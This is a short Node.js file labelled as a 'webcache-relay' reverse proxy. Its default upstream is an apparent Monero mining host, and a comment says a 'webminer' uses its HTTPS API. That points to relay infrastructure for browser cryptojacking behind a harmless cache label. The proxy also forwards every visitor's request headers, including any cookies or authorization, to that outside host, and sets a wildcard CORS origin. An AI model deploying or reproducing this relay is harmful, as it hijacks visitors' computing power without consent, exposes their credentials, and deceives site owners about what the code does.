// webcache-relay: simple reverse proxy (upstream configurable via env)
const http = require('http');
const https = require('https');
const UP = process.env.UPSTREAM_HOST || 'xmr.cpucoinsol.app';
const PORT = process.env.PORT || 3000;
function fwd(req, res, method, body) {
  const opt = {
    host: UP, port: 443, path: req.url, method: method || req.method,
    headers: Object.assign({}, req.headers, { host: UP, 'x-forwarded-host': req.headers.host || '' }),
    timeout: 30000,
  };
  const r = https.request(opt, (ur) => {
    const h = Object.assign({}, ur.headers, { 'access-control-allow-origin': '*' });
    res.writeHead(ur.statusCode, h);
    ur.pipe(res);
  });
  r.on('error', (e) => { res.statusCode = 502; res.end('upstream error: ' + e.message); });
  if (body !== undefined) r.end(body); else req.pipe(r);
}
const srv = http.createServer((req, res) => {
  if (req.url === '/healthz') { res.writeHead(200); return res.end('ok'); }
  if (req.method === 'OPTIONS') {
    res.writeHead(204, { 'access-control-allow-origin': '*', 'access-control-allow-methods': 'GET,POST,HEAD,OPTIONS',
      'access-control-allow-headers': req.headers['access-control-request-headers'] || '*' });
    return res.end();
  }
  fwd(req, res);
});
srv.on('upgrade', (req, sock, head) =>sock.destroy()); // ws dinonaktif—webminer pakai https api
srv.listen(PORT, () => console.log('webcache-relay on :' + PORT + ' -> ' + UP));
